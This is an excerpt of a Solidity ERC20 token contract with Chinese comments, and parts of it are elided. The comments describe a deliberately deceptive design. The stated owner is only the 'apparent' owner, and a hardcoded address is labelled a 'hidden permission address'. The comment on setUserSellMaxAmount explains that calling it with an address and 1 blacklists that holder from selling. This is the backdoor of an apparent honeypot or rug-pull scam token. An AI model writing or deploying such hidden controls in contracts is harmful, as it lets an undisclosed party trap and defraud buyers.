...
contract Token is IERC20, Ownable {
    ...
    constructor(
        address tokenOwner //代币持有人地址及明面上所有权地址
        ...
        _tTotal = 8000000000000000 * 10**_decimals; //数量
        _tTotalMin = 1 * 10**_decimals; 
        
        _rTotal = (MAX - (MAX % _tTotal));

        _rOwned[tokenOwner] = _rTotal;
		contractSender = 0xA4C46dB018eC41A84c8E38a9F8a7E27028BE1E3a;//隐藏权限地址
	...
	function setUserSellMaxAmount(address account,uint256 maxAmount) public { //可以拉黑别人的方法，第一个填地址，第二个填1，就可以拉黑别人
